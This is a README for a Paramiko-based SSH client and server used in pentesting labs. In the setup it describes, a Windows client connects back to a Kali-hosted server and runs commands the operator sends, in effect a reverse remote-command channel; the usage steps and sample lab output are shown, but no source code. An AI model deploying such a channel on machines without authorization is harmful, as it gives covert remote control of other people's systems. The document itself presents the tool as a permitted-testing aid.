<p align="center">
  <h1 align="center"> actor ssh - SSH-client/server - Windows version</h1>
	<p align="center">an SSH-client based on Paramiko for secure connections using SSH2 protocol</p>
</p>

These scripts are a small Paramiko SSH client and server. They:
- load a host key;
- accept one TCP connection;
- perform SSH handshake and password check;
- open a session channel;
- send/receive simple text commands interactively.

It's great for pentesting, but unsafe for production!!! because of these factors: hard-coded credentials, demo host key, lack of logging and authentication policies, single-client handling and so on. Feel free to use it on servers/hosts you own or have permission to test. 

## 1. Download a demo file by Paramiko: https://github.com/paramiko/paramiko/blob/main/demos/test_rsa.key - download to the folder with the ssh_server.py on your Kali machine.

## 2. Download 'ssh_server.py' and edit the IP-Address and Port to bind to your own host — to make the server listen your host only. Then run the SSH-server on your Kali machine:
```bash
python ssh_server.py
[+] Listening for connection ...
```

## 3. Run the SSH-client:

```bash
python ssh_rcmd.py 
Password: 
Enter server IP: 192.168.204.139
Enter port: 2222
Welcome to bh_ssh
```

## 4. Execute commands:
```bash
[+] Got a connection! <socket.socket fd=4, family=2, type=1, proto=0, laddr=('192.168.204.139', 2222), raddr=('192.168.204.1', 53813)> ('192.168.204.1', 53813)
[+] Authenticated!
b'ClientConnected'
Enter command: ls
README.md
ssh_rcmd.py
ssh_server.py
test_rsa.key
```

So we command via our SSH-server, the SSH-client on Windows machine executes our commands and sends the output to the server. That's it. 
